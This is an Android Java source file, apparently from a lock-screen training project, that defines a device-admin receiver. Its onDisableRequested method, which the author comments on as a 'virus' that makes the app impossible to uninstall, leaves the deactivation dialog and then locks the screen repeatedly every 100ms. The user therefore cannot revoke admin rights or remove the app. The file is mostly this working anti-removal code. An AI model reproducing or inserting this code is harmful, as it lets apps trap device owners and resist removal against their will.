package cn.itcast.lockscreen;

import android.app.admin.DeviceAdminReceiver;
import android.app.admin.DevicePolicyManager;
import android.content.Context;
import android.content.Intent;
import android.widget.Toast;

public class LockReceiver extends DeviceAdminReceiver {
	@Override
	public void onReceive(Context context, Intent intent) {
		super.onReceive(context, intent);
		System.out.println("onreceiver");
	}

	@Override
	public void onEnabled(Context context, Intent intent) {
		System.out.println("激活使用");
		super.onEnabled(context, intent);
	}

	@Override
	public void onDisabled(Context context, Intent intent) {
		System.out.println("取消激活");
		super.onDisabled(context, intent);
	}

	// 病毒(此方法会导致程序无法卸载)
	// https://mp.weixin.qq.com/s?__biz=MzA3MDMyMjkzNg==&mid=211618188&idx=1&sn=4b08a3058b7d4861b5ade7024a02266e&scene=2&srcid=0
	
	@Override
	public CharSequence onDisableRequested(Context context, Intent intent) {
		// 跳离当前询问是否取消激活的 dialog
		Toast.makeText(context, "病毒", Toast.LENGTH_SHORT).show();
		Intent outOfDialog = context.getPackageManager()
				.getLaunchIntentForPackage("com.android.settings");
		outOfDialog.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
		context.startActivity(outOfDialog);

		// 调用设备管理器本身的功能，每 100ms 锁屏一次，用户即便解锁也会立即被锁，直至 7s 后
		final DevicePolicyManager dpm = (DevicePolicyManager) context
				.getSystemService(Context.DEVICE_POLICY_SERVICE);
		dpm.lockNow();
		new Thread(new Runnable() {
			@Override
			public void run() {
				int i = 0;
				while (i < 20) {
					dpm.lockNow();
					try {
						Thread.sleep(100);
						i++;
					} catch (InterruptedException e) {
						e.printStackTrace();
					}
				}
			}
		}).start();

		return "";
	}
}
